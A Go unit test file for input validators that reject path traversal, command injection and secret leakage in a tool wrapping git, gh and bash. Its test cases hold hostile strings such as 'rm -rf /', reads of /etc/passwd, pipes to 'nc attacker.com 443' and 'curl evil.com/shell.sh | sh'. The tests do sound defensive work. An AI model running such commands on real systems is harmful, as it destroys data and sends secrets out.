package util

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidatePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{
			name:    "valid relative path",
			path:    "test/file.txt",
			wantErr: false,
		},
		{
			name:    "valid absolute path",
			path:    "/tmp/test/file.txt",
			wantErr: false,
		},
		{
			name:    "path traversal attack",
			path:    "../../../etc/passwd",
			wantErr: true,
		},
		{
			name:    "null byte injection",
			path:    "test\x00file.txt",
			wantErr: true,
		},
		{
			name:    "empty path",
			path:    "",
			wantErr: true,
		},
		{
			name:    "system path access attempt",
			path:    "/etc/passwd",
			wantErr: true,
		},
		{
			name:    "proc access attempt",
			path:    "/proc/version",
			wantErr: true,
		},
		{
			name:    "windows system path access attempt",
			path:    "C:\\Windows\\System32\\config\\sam",
			wantErr: true,
		},
		{
			name:    "windows program files access attempt",
			path:    "C:\\Program Files\\sensitive",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateRepository(t *testing.T) {
	tests := []struct {
		name    string
		repo    string
		wantErr bool
	}{
		{
			name:    "valid GitHub repo",
			repo:    "user/repo",
			wantErr: false,
		},
		{
			name:    "valid repo with dots",
			repo:    "user/repo.name",
			wantErr: false,
		},
		{
			name:    "command injection attempt",
			repo:    "user/repo; rm -rf /",
			wantErr: true,
		},
		{
			name:    "pipe injection",
			repo:    "user/repo | cat /etc/passwd",
			wantErr: true,
		},
		{
			name:    "empty repository",
			repo:    "",
			wantErr: true,
		},
		{
			name:    "backtick injection",
			repo:    "user/repo`whoami`",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRepository(tt.repo)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateRepository() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateBranch(t *testing.T) {
	tests := []struct {
		name    string
		branch  string
		wantErr bool
	}{
		{
			name:    "empty branch (allowed)",
			branch:  "",
			wantErr: false,
		},
		{
			name:    "valid branch name",
			branch:  "main",
			wantErr: false,
		},
		{
			name:    "valid branch with slashes",
			branch:  "feature/new-feature",
			wantErr: false,
		},
		{
			name:    "injection attempt",
			branch:  "main; rm -rf /",
			wantErr: true,
		},
		{
			name:    "path traversal in branch",
			branch:  "../main",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateBranch(tt.branch)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateBranch() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSecureCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
		wantErr bool
	}{
		{
			name:    "allowed git command",
			command: "git",
			args:    []string{"status"},
			wantErr: false,
		},
		{
			name:    "allowed gh command",
			command: "gh",
			args:    []string{"repo", "clone"},
			wantErr: false,
		},
		{
			name:    "disallowed command",
			command: "rm",
			args:    []string{"-rf", "/"},
			wantErr: true,
		},
		{
			name:    "empty command",
			command: "",
			args:    []string{},
			wantErr: true,
		},
		{
			name:    "injection in args",
			command: "git",
			args:    []string{"status", ";", "rm", "-rf", "/"},
			wantErr: true,
		},
		{
			name:    "backtick injection in args",
			command: "git",
			args:    []string{"status", "`cat /etc/passwd`"},
			wantErr: true,
		},
		{
			name:    "command substitution in args",
			command: "git",
			args:    []string{"status", "$(cat /etc/passwd)"},
			wantErr: true,
		},
		{
			name:    "pipe in args",
			command: "git",
			args:    []string{"status", "|", "nc", "attacker.com", "443"},
			wantErr: true,
		},
		{
			name:    "null byte in args",
			command: "git",
			args:    []string{"status\x00"},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SecureCommand(tt.command, tt.args...)
			if (err != nil) != tt.wantErr {
				t.Errorf("SecureCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateScriptPath(t *testing.T) {
	// Create a temporary script for testing
	tmpDir := t.TempDir()
	scriptPath := filepath.Join(tmpDir, "scripts", "test.sh")
	os.MkdirAll(filepath.Dir(scriptPath), 0755)
	os.WriteFile(scriptPath, []byte("#!/bin/bash\necho test"), 0755)

	// Change to tmp directory for relative path tests
	originalWd, _ := os.Getwd()
	os.Chdir(tmpDir)
	defer os.Chdir(originalWd)

	tests := []struct {
		name       string
		scriptPath string
		wantErr    bool
	}{
		{
			name:       "Valid script in scripts directory",
			scriptPath: "scripts/test.sh",
			wantErr:    false,
		},
		{
			name:       "Script with path traversal",
			scriptPath: "../../../etc/passwd",
			wantErr:    true,
		},
		{
			name:       "Script outside allowed directories",
			scriptPath: "/tmp/malicious.sh",
			wantErr:    true,
		},
		{
			name:       "Empty script path",
			scriptPath: "",
			wantErr:    true,
		},
		{
			name:       "Directory instead of script",
			scriptPath: "scripts",
			wantErr:    true,
		},
		{
			name:       "Non-existent script",
			scriptPath: "scripts/nonexistent.sh",
			wantErr:    true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScriptPath(tt.scriptPath)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateScriptPath() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSecureCommandWithBash(t *testing.T) {
	// Create a temporary script for testing
	tmpDir := t.TempDir()
	scriptPath := filepath.Join(tmpDir, "scripts", "test.sh")
	os.MkdirAll(filepath.Dir(scriptPath), 0755)
	os.WriteFile(scriptPath, []byte("#!/bin/bash\necho test"), 0755)

	// Change to tmp directory for relative path tests
	originalWd, _ := os.Getwd()
	os.Chdir(tmpDir)
	defer os.Chdir(originalWd)

	tests := []struct {
		name    string
		command string
		args    []string
		wantErr bool
	}{
		{
			name:    "Valid bash script in allowed directory",
			command: "bash",
			args:    []string{"scripts/test.sh", "arg1", "arg2"},
			wantErr: false,
		},
		{
			name:    "Bash script with path traversal",
			command: "bash",
			args:    []string{"../../../etc/passwd"},
			wantErr: true,
		},
		{
			name:    "Bash script outside allowed directories",
			command: "bash",
			args:    []string{"/tmp/malicious.sh"},
			wantErr: true,
		},
		{
			name:    "Bash with command injection in script arg",
			command: "bash",
			args:    []string{"scripts/test.sh; rm -rf /"},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SecureCommand(tt.command, tt.args...)
			if (err != nil) != tt.wantErr {
				t.Errorf("SecureCommand() with bash error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestCommandInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"script.sh; rm -rf /",
		"script.sh && cat /etc/passwd",
		"script.sh | nc attacker.com 443",
		"${IFS}rm${IFS}-rf${IFS}/",
		"script.sh`cat /etc/passwd`",
		"script.sh$(whoami)",
		"script.sh\nrm -rf /",
		"script.sh\x00rm -rf /",
		"../../bin/sh",
		"script.sh || curl evil.com/shell.sh | sh",
		"script.sh & disown",
		"script.sh > /dev/null; wget evil.com/backdoor",
	}

	for _, input := range maliciousInputs {
		t.Run("Malicious input: "+input, func(t *testing.T) {
			// Test as command argument
			err := validateCommandArg(input)
			if err == nil {
				t.Errorf("Expected error for malicious input: %s", input)
			}

			// Test as script path
			err = ValidateScriptPath(input)
			if err == nil {
				t.Errorf("Expected error for malicious script path: %s", input)
			}

			// Test with SecureCommand
			_, err = SecureCommand("bash", input)
			if err == nil {
				t.Errorf("Expected error for malicious command: %s", input)
			}
		})
	}
}

func TestGetSecureEnv(t *testing.T) {
	// Set some test environment variables
	os.Setenv("PATH", "/usr/bin:/bin")
	os.Setenv("HOME", "/home/user")
	os.Setenv("SECRET_KEY", "super-secret")
	os.Setenv("DATABASE_PASSWORD", "password123")
	defer func() {
		os.Unsetenv("SECRET_KEY")
		os.Unsetenv("DATABASE_PASSWORD")
	}()

	env := getSecureEnv()

	// Check that allowed variables are present
	hasPath := false
	hasHome := false
	hasSecret := false
	hasPassword := false

	for _, e := range env {
		if strings.HasPrefix(e, "PATH=") {
			hasPath = true
		}
		if strings.HasPrefix(e, "HOME=") {
			hasHome = true
		}
		if strings.Contains(e, "SECRET_KEY") {
			hasSecret = true
		}
		if strings.Contains(e, "DATABASE_PASSWORD") {
			hasPassword = true
		}
	}

	if !hasPath {
		t.Error("Expected PATH in secure environment")
	}
	if !hasHome {
		t.Error("Expected HOME in secure environment")
	}
	if hasSecret {
		t.Error("SECRET_KEY should not be in secure environment")
	}
	if hasPassword {
		t.Error("DATABASE_PASSWORD should not be in secure environment")
	}
}
